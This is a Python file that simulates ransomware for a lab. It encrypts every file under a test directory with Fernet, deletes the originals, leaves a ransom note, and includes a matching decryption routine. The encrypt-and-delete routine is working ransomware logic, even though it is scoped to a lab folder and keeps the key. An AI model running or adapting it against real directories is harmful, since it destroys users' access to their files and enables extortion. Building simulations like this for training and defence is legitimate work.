# file_simulator.py
import os
import random
from cryptography.fernet import Fernet
from typing import List

# --- LAB CONFIGURATION ---
TEST_DIRECTORY = "./test_files_for_lab"
ENCRYPTED_EXTENSION = '.locked'
RANSOM_NOTE_FILENAME = 'READ_ME_TO_RECOVER.txt'

class RansomwareLab:
    """Module for safe, ethical ransomware behavior simulation."""
    
    def __init__(self, root_dir=TEST_DIRECTORY):
        self.root_dir = root_dir
        if not os.path.exists(self.root_dir):
            os.makedirs(self.root_dir)
        self.key = None

    def _get_files_to_process(self, encrypted: bool) -> List[str]:
        """Finds files that are either encrypted or unencrypted."""
        file_list = []
        target_ext = ENCRYPTED_EXTENSION
        
        for root, _, files in os.walk(self.root_dir):
            for file in files:
                full_path = os.path.join(root, file)
                if encrypted and file.endswith(target_ext):
                    file_list.append(full_path)
                elif not encrypted and not file.endswith(target_ext) and file not in [os.path.basename(__file__), RANSOM_NOTE_FILENAME]:
                    file_list.append(full_path)
        return file_list

    def create_ransom_note(self, unique_id: str):
        """Creates a non-functional ransom note text file."""
        note_path = os.path.join(self.root_dir, RANSOM_NOTE_FILENAME)
        note_content = f"""
        # YOUR FILES HAVE BEEN ENCRYPTED! #
        
        This is a simulation for educational purposes.
        
        Your unique decryption ID (for lab tracking): {unique_id}
        """
        with open(note_path, 'w') as f:
            f.write(note_content)
        print(f"[RANSOM-NOTE] Created: {RANSOM_NOTE_FILENAME}")

    def encrypt_files(self):
        """Simulates the ransomware attack phase."""
        self.key = Fernet.generate_key()
        f = Fernet(self.key)
        
        files_to_process = self._get_files_to_process(encrypted=False)
        print(f"\n[RANSOM-LAB] Encrypting {len(files_to_process)} files in {self.root_dir}...")
        
        for file_path in files_to_process:
            with open(file_path, 'rb') as file:
                processed_data = f.encrypt(file.read())
            
            new_path = file_path + ENCRYPTED_EXTENSION
            with open(new_path, 'wb') as file:
                file.write(processed_data)
            os.remove(file_path) 

        unique_id = ''.join([str(random.randint(0, 9)) for _ in range(10)])
        self.create_ransom_note(unique_id)
        
        print(f"\n[ATTACK COMPLETE] Files encrypted. **Key (for recovery) is stored.**")
        return self.key

    def decrypt_files(self, key: bytes):
        """Simulates the recovery (Blue Team) phase."""
        # Clean up the ransom note during recovery
        note_path = os.path.join(self.root_dir, RANSOM_NOTE_FILENAME)
        if os.path.exists(note_path):
            os.remove(note_path)
            print(f"[CLEANUP] Removed {RANSOM_NOTE_FILENAME}.")
            
        f = Fernet(key)
        files_to_process = self._get_files_to_process(encrypted=True)
        print(f"\n[RECOVERY] Decrypting {len(files_to_process)} files...")

        for file_path in files_to_process:
            try:
                with open(file_path, 'rb') as file:
                    processed_data = f.decrypt(file.read())
                
                new_path = file_path.replace(ENCRYPTED_EXTENSION, '')
                with open(new_path, 'wb') as file:
                    file.write(processed_data)
                os.remove(file_path)
            except Exception as e:
                print(f"[ERROR] Failed to decrypt {file_path}. Key may be wrong. ({e})")
        
        print(f"\n[RECOVERY COMPLETE] {len(files_to_process)} files recovered.")